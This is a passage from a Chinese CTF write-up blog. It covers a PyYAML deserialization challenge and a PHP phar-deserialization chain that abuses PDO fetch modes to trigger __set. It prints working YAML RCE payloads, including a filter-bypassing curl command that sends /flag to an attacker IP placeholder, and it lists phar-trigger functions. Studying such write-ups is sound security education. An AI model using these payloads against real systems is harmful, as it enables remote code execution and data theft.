&#123;&quot;extend&quot;: !!python/name:exec &#125;]<br>  listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;<br></code></pre></td></tr></table></figure><p>然后利用python的引号直接拼接，再套一层exec即可</p><p>里面参数改一下，改成这样形式拼接即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">exec(\&quot;__import__(&#x27;o&#x27;&#x27;s&#x27;).sys\&quot;\&quot;tem(&#x27;ca&#x27;&#x27;lc&#x27;)\&quot;)<br></code></pre></td></tr></table></figure><p>然后他能出网，可以用拼接绕过curl，最终exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">!!python/object/new:type<br>  args: [&quot;z&quot;, !!python/tuple [], &#123;&quot;extend&quot;: !!python/name:exec &#125;]<br>  listitems: &quot;exec(\&quot;__import__(&#x27;o&#x27;&#x27;s&#x27;).sys\&quot;\&quot;tem(&#x27;cu&#x27;&#x27;rl http://&lt;ip地址&gt;:8888 -d `cat /flag`&#x27;)\&quot;)&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250209211435738.png" alt="image-20250209211435738"></p><h2 id="官方解法"><a href="#官方解法-1" class="headerlink" title="官方解法"></a>官方解法</h2><p>这里学到官方的一个回显技巧，通过Server请求头带出数据</p><p>werkzeug.serving.WSGIRequestHandler这个处理器是用来处理请求头的</p><p>Server头的值是server_version属性和sys_version属性拼接在一起的</p><p>那我们只需要想办法修改server_version属性或者sys_version属性即可带出数据了</p><p>用setattr就可以改了，完整yaml如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">type</span><br>        args:<br>         - exp<br>         - !!python/<span class="hljs-built_in">tuple</span> []<br>         - &#123;<span class="hljs-string">&quot;extend&quot;</span>: !!python/name:<span class="hljs-built_in">exec</span> &#125;<br>        listitems: |<br>         bb=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read()<br>         <span class="hljs-keyword">import</span> werkzeug<br>         <span class="hljs-built_in">setattr</span>(werkzeug.serving.WSGIRequestHandler, <span class="hljs-string">&quot;server_version&quot;</span>,bb )<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250209210050744.png" alt="image-20250209210050744"></p><h1 id="strange_php"><a href="#strange-php" class="headerlink" title="strange_php"></a>strange_php</h1><p>一个php写的留言板应用，需要我们进行代码审计，但是很多地方的后缀都是写死的，只有一个地方的文件路径我们是可以控制的</p><p>就在welcome.php的delete模块的地方</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PDO_connect.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;User.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span>  <span class="hljs-string">&#x27;UserMessage.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>   <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.html&quot;</span>);<br>   <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$Message</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserMessage</span>();<br><br><br><span class="hljs-variable">$userMessage</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserMessage</span>();<br><span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PDO_connect</span>();<br><span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">init</span>();<br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_connection</span>();<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$action</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$action</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$action</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;message&#x27;</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;write messageing&quot;</span>;<br>            <span class="hljs-variable">$decodedMessage</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;encodedMessage&#x27;</span>]);<br>            <br>            <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">writeMessage</span>(<span class="hljs-variable">$decodedMessage</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>===<span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;写入失败&quot;</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-variable">$filePath</span> = <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">get_filePath</span>();<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>] = <span class="hljs-variable">$filePath</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;留言已写入: &quot;</span>. <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">get_filePath</span>();<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;editMessage&#x27;</span>:<br>                <span class="hljs-variable">$decodedEditMessage</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;encodedEditMessage&#x27;</span>]);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>]))&#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">editMessage</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>],<span class="hljs-variable">$decodedEditMessage</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;留言已成功更改&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;操作失败，请重新尝试&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;delete&#x27;</span>:<br>            <span class="hljs-variable">$message</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>]?<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>]:<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>];<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">deleteMessage</span>(<span class="hljs-variable">$message</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;留言已成功删除&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;操作失败，请重新尝试&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;clean&#x27;</span>:<br>                <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;rm log/*&#x27;</span>);<br>                <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;rm txt/*&#x27;</span>);<br>    &#125;<br><br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里调用deleteMessage方法传入我们要删除的文件路径</p><p><img src="https://cdn.clown2024.cn/image-20241225223721578.png" alt="image-20241225223721578"></p><h2 id="phar反序列化的触发"><a href="#phar反序列化的触发" class="headerlink" title="phar反序列化的触发"></a>phar反序列化的触发</h2><p>然后这里调用了file_exists()函数判断是否存在该文件，一开始审到这里我是不知道这能触发phar反序列化的，在队友提醒下才知道🥲，然后找了找，这篇文章有介绍能够触发phar的函数：<a href="https://blog.csdn.net/weixin_53912233/article/details/136201466">https://blog.csdn.net/weixin_53912233/article/details/136201466</a></p><p>这里也记录一下能够触发phar反序列化的方法</p><p>一些触发phar的敏感函数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">fileatime / filectime / filemtime<br>stat / fileinode / fileowner / filegroup / fileperms<br>file / file_get_contents / readfile / fopen<br>file_exists / is_dir / is_executable / is_file <br>is_link / is_readable / is_writeable / is_writable<br>parse_ini_file<br>unlink<br>copy<br></code></pre></td></tr></table></figure><p>其他触发函数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">image<br>    exif_thumbnail<br>    exif_imagetype<br>    imageloadfont<br>    imagecreatefrom***<br>    getimagesize<br>    getimagesizefromstring<br>hash<br>    hash_hmac_file<br>    hash_file<br>    hash_update_file<br>    md5_file<br>    sha1_file<br>file / url<br>    get_meta_tags<br>    get_headers<br><br></code></pre></td></tr></table></figure><h2 id="寻找反序列化的点"><a href="#寻找反序列化的点" class="headerlink" title="寻找反序列化的点"></a>寻找反序列化的点</h2><p>然后就是找要触发什么链子了，但是全文就一个_set魔术方法</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserMessage</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$filePath</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filePath = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">generateFileName</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeMessage</span>(<span class="hljs-params"><span class="hljs-variable">$message</span></span>) </span>&#123;<br><br><br>        <span class="hljs-comment">// 写入留言到文件中</span><br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filePath, <span class="hljs-variable">$message</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editMessage</span>(<span class="hljs-params"><span class="hljs-variable">$path</span>,<span class="hljs-variable">$newMessage</span></span>) </span>&#123;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$newMessage</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_filePath</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;filePath;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span> = <span class="hljs-variable">$value</span>;<br>           <span class="hljs-variable">$a</span> =  <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filePath).<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;/var/www/html/log/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;filePath).<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-variable">$a</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deleteMessage</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-variable">$path</span> = <span class="hljs-variable">$path</span>.<span class="hljs-string">&quot;.txt&quot;</span>;<br>        <span class="hljs-comment">// 删除留言文件</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$path</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$msg</span> === <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateFileName</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$timestamp</span> = <span class="hljs-title function_ invoke__">microtime</span>(<span class="hljs-literal">true</span>);<br>        <span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$timestamp</span>);<br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-string">&quot;./txt/&quot;</span>.<span class="hljs-variable">$hash</span> . <span class="hljs-string">&quot;.txt&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileName</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readMessage</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// 读取并返回留言文件的内容</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;filePath)) &#123;<br>            <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filePath);<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$message</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>没想到什么触发的方法，如果能触发且filepath可控，就可以直接读取flag文件然后写到日志文件中，然后就想能不能打原生类读文件什么的，也没有找到相关的方法，所以就卡着了。</p><p>唯一解就是gxn大哥的解，看了gxn大哥wp发现是用PDO来触发，然后突然想起来我在搜索的时候也看到相关的文章：<a href="https://xz.aliyun.com/t/6699?time__1311=n4+xnD0Dg7KQq0KGQ3DsA3xCwqWqobqxET2oTD#toc-3">https://xz.aliyun.com/t/6699?time__1311=n4%2BxnD0Dg7KQq0KGQ3DsA3xCwqWqobqxET2oTD#toc-3</a></p><p>虽然这里也是用PDO的但是和本题的解法不一样，这篇文章里的phar有机会也学一下水篇文章</p><p>接下来说说本题的解法，这个思路看完之后确实妙，是本菜鸡想不出来的思路😭</p><p>这里关键就是触发__set魔术方法，我们知道__set方法就是访问不存在的属性的时候会触发，我们可以关注一下PDO_connect.php这个类</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PDO_connect</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$pdo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$con_options</span> = [];<span class="hljs-comment">//use to set options of PDO connections</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$smt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;con_options = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&quot;dsn&quot;</span>=&gt;<span class="hljs-string">&quot;mysql:host=localhost:3306;dbname=users;charset=utf8&quot;</span>,<br>            <span class="hljs-string">&#x27;host&#x27;</span>=&gt;<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>            <span class="hljs-string">&#x27;port&#x27;</span>=&gt;<span class="hljs-string">&#x27;3306&#x27;</span>,<br>            <span class="hljs-string">&#x27;user&#x27;</span>=&gt;<span class="hljs-string">&#x27;joker&#x27;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-string">&#x27;joker&#x27;</span>,<br>            <span class="hljs-string">&#x27;charset&#x27;</span>=&gt;<span class="hljs-string">&#x27;utf8&#x27;</span>,<br>            <span class="hljs-string">&#x27;options&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>=&gt;PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>,<br>                PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span> =&gt; PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>)<br>        );<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_connection</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;dsn&#x27;</span>], <span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;user&#x27;</span>], <span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;options&#x27;</span>][PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>])&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, <span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;options&#x27;</span>][PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>]);<br>            &#125;<br>            <br>            <br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;options&#x27;</span>][PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>]))&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>, <span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;options&#x27;</span>][PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>]);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Connection Error: &#x27;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;conn;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有个option，可以设置一些PDO相关的选项，这里有两个选项</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PDO::ATTR_DEFAULT_FETCH_MODE<br>PDO::ATTR_ERRMODE<br></code></pre></td></tr></table></figure><p>这两个选项可以翻一番官方文档知道是干什么的：<a href="https://www.php.net/manual/zh/pdostatement.fetch.php">https://www.php.net/manual/zh/pdostatement.fetch.php</a></p><p>第二个是设置报错方式，不是什么重点内容</p><p><img src="https://cdn.clown2024.cn/image-20241226000208435.png" alt="image-20241226000208435"></p><p>重点是第一个</p><p><img src="https://cdn.clown2024.cn/image-20241226000229404.png" alt="image-20241226000229404"></p><p>也就是设置默认获取数据时候的形式，那就是和调用fetch方法有关，这里可以再看一下User.php的源码</p><p>类里面有一个log方法</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">try</span>&#123;<br><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username = :username&quot;</span>;<br>        <span class="hljs-variable">$pdo</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">get_connection</span>();<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br><br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>(<span class="hljs-string">&#x27;:username&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;username);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里的fetch方法执行的是默认获取参数，其他的都是写死的，欸然后思路就打开了，我们就可以通过我们已知的phar反序列化去改变这个连接属性，至于改什么呢，<del>我们可以改成下面这个262144</del></p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">  * Determine the class name from the value of first column.</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@link</span> https://php.net/manual/en/pdo.constants.php#pdo.constants.fetch-classtype</span><br><span class="hljs-comment">  */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FETCH_CLASSTYPE</span> = <span class="hljs-number">262144</span>;<br></code></pre></td></tr></table></figure><p>我们点进源码翻就可以翻到这个属性，该属性的意思就是根据第一列的值来确定类名</p><blockquote><p>具体是什么意思呢，就是我们fetch返回的时候，PDO 会检查结果集的第一列，并将该列的值作为类名来创建对象。如果该列的值为字符串 “classname”，则 PDO 会尝试实例化一个名为 “classname” 的类的对象。</p><p><del>然后这里还有一点，他会将其余的列名设置为该对象的属性，也就是自动初始化且访问属性并赋值了</del>这里有问题后面说🥲</p><p>这里还重新调用了一遍get_connection方法，所以这也确定是我们的入口类了</p></blockquote><p>那么也就是说，我们可以通过phar修改PDO_connect的配置，让他连接我们自己的远程数据库，然后返回一个存在的对象，但是列名是不存在的属性，从而可以触发我们的_set方法</p><p>我们本地可以测试一下，代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;setup!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=localhost:3306;dbname=test;charset=utf8&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>);<br><span class="hljs-comment">// $conn-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE,PDO::FETCH_CLASSTYPE);</span><br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>, PDO::<span class="hljs-variable constant_">FETCH_CLASS</span> | PDO::<span class="hljs-variable constant_">FETCH_CLASSTYPE</span>);<br><span class="hljs-comment">// $conn-&gt;setAttribute(PDO::ATTR_CLASSTYPE, &#x27;Test&#x27;);</span><br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM das&quot;</span>;<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br>    <br><span class="hljs-comment">// 执行查询</span><br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    <br><span class="hljs-comment">// 获取结果</span><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br><br></code></pre></td></tr></table></figure><p>表结构如下：</p><p><img src="https://cdn.clown2024.cn/image-20241226212228136.png" alt="image-20241226212228136"></p><p>最后的结果如下：</p><p><img src="https://cdn.clown2024.cn/image-20241226212501441.png" alt="image-20241226212501441"></p><p>但是这里有个问题，一开始我以为是gxn大哥的数字写错了，因为<code>FETCH_CLASSTYPE</code>的数字并不是262152，然后我就只设置了FETCH_CLASSTYPE这个属性，但是发现他会报错：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PDOException: SQLSTATE[HY000]: General error: PDO::FETCH_CLASSTYPE can only be used together with PDO::FETCH_CLASS<br></code></pre></td></tr></table></figure><p>说还需要配合<code>FETCH_CLASS</code>使用，然后再去找一下这个属性</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Specifies that the fetch method shall return a new instance of the</span><br><span class="hljs-comment">     * requested class, mapping the columns to named properties in the class.</span><br><span class="hljs-comment">     * The magic</span><br><span class="hljs-comment">     * &lt;b&gt;__set&lt;/b&gt;</span><br><span class="hljs-comment">     * method is called if the property doesn&#x27;t exist in the requested class</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@link</span> https://php.net/manual/en/pdo.constants.php#pdo.constants.fetch-class</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FETCH_CLASS</span> = <span class="hljs-number">8</span>;<br></code></pre></td></tr></table></figure><p>大体意思就是说，fetch方法返回一个类，然后将列映射到命名属性上面，如果请求的类不存在该属性，则调用__set方法，所以这个才是最关键的属性，然后FETCH_CLASSTYPE相当于指定了类的名字，有点类似过滤器的意思了，然后他们两个的值或出来 8 | 262144 &#x3D; 262152，刚好就是262152。（这里看了我半天真的😭）</p><p>所以这么写也是可以的</p><figure class="highlight 